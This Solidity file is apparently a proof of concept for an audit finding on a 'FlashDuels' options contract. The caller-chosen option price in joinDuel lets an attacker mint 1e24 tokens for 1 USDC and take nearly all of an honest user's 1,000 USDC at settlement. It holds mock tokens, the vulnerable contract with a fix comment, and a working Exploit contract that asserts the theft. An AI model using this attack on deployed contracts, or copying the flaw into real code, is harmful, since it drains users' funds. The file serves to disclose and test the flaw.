// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Filament — user-controlled options price (Zokyo, 2024-11-21)
    joinDuel mints (_amount * 1e18) / _optionPrice and the caller supplies
    _optionPrice. A 1,000 USDC wager at price 1e6 mints 1,000e18 option tokens.
    A 1 USDC wager at price 1 mints 1e24. Settlement pays
    balance / supply of the USDC pool, so the 1 USDC joiner takes 999.999999 USDC
    and the 1,000 USDC joiner is paid 0.999999 USDC. */

contract Usdc {
    string public symbol = "USDC";
    uint8 public constant decimals = 6;
    address public minter;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor() {
        minter = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "minter");
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract OptionToken {
    string public symbol = "OPT";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    address public minter;

    constructor() {
        minter = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "minter");
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

contract FlashDuels {
    Usdc public usdc;
    OptionToken public optionToken;
    uint256 public totalWager;
    uint256 public minOptionPrice;

    constructor(Usdc _usdc, uint256 _minOptionPrice) {
        usdc = _usdc;
        minOptionPrice = _minOptionPrice;
        optionToken = new OptionToken();
    }

    function joinDuel(
        string memory,
        string memory,
        uint256,
        uint256 _optionPrice,
        uint256 _amount
    ) external {
        require(_amount >= _optionPrice, "below price");
        if (minOptionPrice != 0) {
            require(_optionPrice >= minOptionPrice, "min price");
        }
        require(usdc.transferFrom(msg.sender, address(this), _amount), "usdc");
        // @> VULN: the joiner picks _optionPrice, so 1 wei mints _amount * 1e18 tokens
        uint256 amountTokenToMint = (_amount * 1e18) / _optionPrice;
        // FIX: require(_optionPrice >= MIN_OPTION_PRICE) before this division.
        optionToken.mint(msg.sender, amountTokenToMint);
        totalWager += _amount;
    }

    function _getUserDuelOptionShare(address user) public view returns (uint256 optionShare) {
        uint256 bal = optionToken.balanceOf(user);
        uint256 supply = optionToken.totalSupply();
        optionShare = (bal * 1e18) / supply;
    }

    function settle(address[] calldata winners) external {
        uint256 pool = usdc.balanceOf(address(this));
        for (uint256 i; i < winners.length; ++i) {
            uint256 winnerShare = _getUserDuelOptionShare(winners[i]);
            uint256 payout = (winnerShare * pool) / 1e18;
            if (payout != 0) {
                require(usdc.transfer(winners[i], payout), "pay");
            }
        }
    }
}

contract Wallet {
    function approve(Usdc token, address spender, uint256 amount) external {
        token.approve(spender, amount);
    }

    function join(FlashDuels duels, uint256 price, uint256 amount) external {
        duels.joinDuel("1", "yes", 0, price, amount);
    }
}

contract Exploit {
    uint256 public constant HONEST_AMOUNT = 1_000_000_000;
    uint256 public constant ATTACK_AMOUNT = 1_000_000;
    uint256 public constant FAIR_PRICE = 1_000_000;
    uint256 public constant ATTACK_PAYOUT = 999_999_999;
    uint256 public constant HONEST_PAYOUT = 999_999;

    Usdc public usdc; // nonce 1
    Wallet public honest; // nonce 2
    Wallet public attacker; // nonce 3
    FlashDuels public duels; // nonce 4

    constructor() {
        usdc = new Usdc();
        honest = new Wallet();
        attacker = new Wallet();
        duels = new FlashDuels(usdc, 0);
        usdc.mint(address(honest), HONEST_AMOUNT);
        usdc.mint(address(attacker), ATTACK_AMOUNT);
        honest.approve(usdc, address(duels), HONEST_AMOUNT);
        attacker.approve(usdc, address(duels), ATTACK_AMOUNT);
    }

    function run() external {
        uint256 beforeAtk = usdc.balanceOf(address(attacker));
        honest.join(duels, FAIR_PRICE, HONEST_AMOUNT);
        attacker.join(duels, 1, ATTACK_AMOUNT);
        require(duels.optionToken().balanceOf(address(attacker)) == 1e24, "minted 1e24");
        require(duels.optionToken().balanceOf(address(honest)) == 1_000 ether, "honest mint");
        address[] memory winners = new address[](2);
        winners[0] = address(honest);
        winners[1] = address(attacker);
        duels.settle(winners);
        require(usdc.balanceOf(address(honest)) == HONEST_PAYOUT, "honest wiped");
        require(usdc.balanceOf(address(attacker)) == ATTACK_PAYOUT, "attacker payout");
        require(usdc.balanceOf(address(attacker)) - beforeAtk == ATTACK_PAYOUT - ATTACK_AMOUNT, "profit");
    }
}
